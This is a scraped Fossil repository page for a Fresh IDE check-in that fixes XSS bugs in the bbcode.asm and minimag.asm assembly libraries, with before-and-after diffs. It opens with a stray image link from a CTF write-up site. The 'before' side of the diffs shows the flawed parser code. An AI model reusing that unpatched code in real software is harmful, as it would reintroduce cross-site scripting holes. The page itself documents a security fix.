v=2)![](https://ctf.zeyu2001.com/~gitbook/image?url=https%3A%2F%2F3167364547-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MX1bWRlBzHpEPe1TYDD%252Fuploads%252Fbzh4EFucwbMmnrOhOsZ3%252FScreenshot%25202023-03-13%2520at%252010.18.53%2520PM.png%3Falt%3Dmedia%26token%3D2a38c19b-c5b7-4063-a14e-2dffbc26efb4&width=768&dpr=4&quality=100&sign=f6f0e487&sv=2)

=== Content from fresh.flatassembler.net_0b840b62_20250115_092648.html ===

[![logo](https://fresh.flatassembler.net/fossil/repo/fresh/logo)Back to project home](https://fresh.flatassembler.net/)

[Front page](https://fresh.flatassembler.net/fossil/repo/fresh/home)
 [Timeline](https://fresh.flatassembler.net/fossil/repo/fresh/timeline)
 [Files](https://fresh.flatassembler.net/fossil/repo/fresh/dir?ci=tip&type=tree)
 [Leaves](https://fresh.flatassembler.net/fossil/repo/fresh/leaves)
 [Branches](https://fresh.flatassembler.net/fossil/repo/fresh/brlist)
 [Tags](https://fresh.flatassembler.net/fossil/repo/fresh/taglist)
 [Tickets](https://fresh.flatassembler.net/fossil/repo/fresh/reportlist)
 [Wiki](https://fresh.flatassembler.net/fossil/repo/fresh/wiki)
 [Login](https://fresh.flatassembler.net/fossil/repo/fresh/login)

Fresh IDE .
Check-in [a3caaf7ad8]
Not logged in

Overview

| Comment: | Fixed XSS bugs in bbcode.asm and minimag.asm libraries. |
| --- | --- |
| Downloads: | [Tarball](/fossil/repo/fresh/honeypot) | [ZIP archive](/fossil/repo/fresh/honeypot) | [SQL archive](/fossil/repo/fresh/honeypot) |
| Timelines: | [family](/fossil/repo/fresh/honeypot) | [ancestors](/fossil/repo/fresh/honeypot) | [descendants](/fossil/repo/fresh/honeypot) | [both](/fossil/repo/fresh/honeypot) | [FreshLibDev](/fossil/repo/fresh/honeypot) |
| Files: | [files](/fossil/repo/fresh/honeypot) | [file ages](/fossil/repo/fresh/honeypot) | [folders](/fossil/repo/fresh/honeypot) |
| SHA1: | a3caaf7ad85033489e668b5bfa37185b013cfa2e |
| User & Date: | [johnfound](/fossil/repo/fresh/honeypot) on [2023-03-13 12:12:37](/fossil/repo/fresh/honeypot) |
| Other Links: | [manifest](/fossil/repo/fresh/honeypot) | [tags](/fossil/repo/fresh/honeypot) |

Context

| 2023-12-31 |  |  |
| --- | --- | --- |
| [12:00](/fossil/repo/fresh/honeypot) |  | Some work on StrSplitURL.  check-in: [932878b6ae](/fossil/repo/fresh/honeypot) user: [johnfound](/fossil/repo/fresh/honeypot) tags: [FreshLibDev](/fossil/repo/fresh/honeypot) |
| 2023-03-13 |  |  |
| [12:12](/fossil/repo/fresh/honeypot) |  | Fixed XSS bugs in bbcode.asm and minimag.asm libraries.  check-in: [a3caaf7ad8](/fossil/repo/fresh/honeypot) user: [johnfound](/fossil/repo/fresh/honeypot) tags: [FreshLibDev](/fossil/repo/fresh/honeypot) |
| 2023-01-11 |  |  |
| [20:35](/fossil/repo/fresh/honeypot) |  | StrExtractMem implemented in strlib, because StrExtract user StrLen on the source, which can be very slow on big arrays of char. Some work on the Linux X structures and code.  check-in: [38ab02c795](/fossil/repo/fresh/honeypot) user: [johnfound](/fossil/repo/fresh/honeypot) tags: [FreshLibDev](/fossil/repo/fresh/honeypot) |
|  |  |  |

Changes
[Hide Diffs](/fossil/repo/fresh/honeypot)
[Unified Diffs](/fossil/repo/fresh/honeypot)
[Ignore Whitespace](/fossil/repo/fresh/honeypot)
[Patch](/fossil/repo/fresh/honeypot)

Modified [freshlib/data/bbcode.asm](/fossil/repo/fresh/honeypot)
from [[0457fbe206]](/fossil/repo/fresh/honeypot)
to [[6a37c3d35e]](/fossil/repo/fresh/honeypot).

| ```  600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 ... 691 692 693 694 695 696 697 698 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 714  ``` | ```          je      .process_attribute          test    [eax+TOneTag.flags], fEmptyAttr         ; if the tag allows empty attribute, simply copy         jnz     .copy                                   ; the tag suffix without trying to replace the attribute.  ; here copy and encode the attribute value: .process_attribute:         inc     ebx          push    esi ecx [edx+TText.GapBegin]          lea     esi, [edi-1]          mov     [.tagMix], '<u >'  ................................................................................         inc     [edx+TText.GapBegin]         inc     ebx         inc     esi         jmp     .attr_loop   .end_of_attr1:          inc     esi     ; delete "]"         dec     ebx          add     esi, [edx+TText.GapEnd]         sub     esi, [edx+TText.GapBegin]         mov     [edx+TText.GapEnd], esi  .end_of_attr2:          cmp     [.tagMix], '</u>'         jne     .mix_closed          stdcall TextSetGapSize, edx, 4         mov     edi, [edx+TText.GapBegin]         pushd   [.tagMix]         popd    [edx+edi]  ``` | ```         |                 <  <       <         ``` | ```  600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 ... 691 692 693 694 695 696 697  698  699 700 701 702 703 704  705 706 707 708 709 710 711  ``` | ```          je      .process_attribute          test    [eax+TOneTag.flags], fEmptyAttr         ; if the tag allows empty attribute, simply copy         jnz     .copy                                   ; the tag suffix without trying to replace the attribute.  ; here copy and encode the attribute value: .process_attribute: ;        inc     ebx          push    esi ecx [edx+TText.GapBegin]          lea     esi, [edi-1]          mov     [.tagMix], '<u >'  ................................................................................         inc     [edx+TText.GapBegin]         inc     ebx         inc     esi         jmp     .attr_loop   .end_of_attr1:          inc     esi     ; delete "]"           add     esi, [edx+TText.GapEnd]         sub     esi, [edx+TText.GapBegin]         mov     [edx+TText.GapEnd], esi  .end_of_attr2:          cmp     [.tagMix], '</u>'         jne     .mix_closed          stdcall TextSetGapSize, edx, 4         mov     edi, [edx+TText.GapBegin]         pushd   [.tagMix]         popd    [edx+edi]  ``` |
| --- | --- | --- | --- | --- |

Modified [freshlib/data/minimag.asm](/fossil/repo/fresh/honeypot)
from [[bd6c0ac5c5]](/fossil/repo/fresh/honeypot)
to [[5837e009e9]](/fossil/repo/fresh/honeypot).

| ```  131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149  ``` | ```          lea     edi, [ecx+1]  ; the start of the label.         xor     esi, esi         xor     eax, eax  .hash_loop:         inc     ecx         cmp     ecx, [edx+TText.Length]         jae     .second_pass          mov     al, [edx+ecx]         test    al, al         jz      .second_pass          cmp     al, ']'         je      .end_of_lbl          test    al, al         js      .add_hash   ``` | ```         |    |         ``` | ```  131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149  ``` | ```          lea     edi, [ecx+1]  ; the start of the label.         xor     esi, esi         xor     eax, eax  .hash_loop:         inc     ecx         cmp     ecx, [edx+TText.Length]         jae     .end_of_lbl ;.second_pass          mov     al, [edx+ecx]         test    al, al         jz      .end_of_lbl ;.second_pass          cmp     al, ']'         je      .end_of_lbl          test    al, al         js      .add_hash   ``` |
| --- | --- | --- | --- | --- |

Script run time:
10ms

Fossil version [19eaa3cae4] 2018-12-12 20:43:14


